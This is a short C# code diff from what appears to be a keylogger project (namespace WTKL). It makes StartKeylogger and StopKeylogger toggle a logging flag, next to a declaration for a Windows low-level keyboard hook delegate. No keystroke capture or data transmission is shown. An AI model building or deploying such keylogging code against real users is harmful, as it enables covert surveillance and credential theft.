@@ -80,12 +80,14 @@ namespace WTKL
 
         public bool StartKeylogger()
         {
-            return false;
+            logging = true;
+            return logging;
         }
 
         public bool StopKeylogger()
         {
-            return false;
+            logging = false;
+            return logging;
         }
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
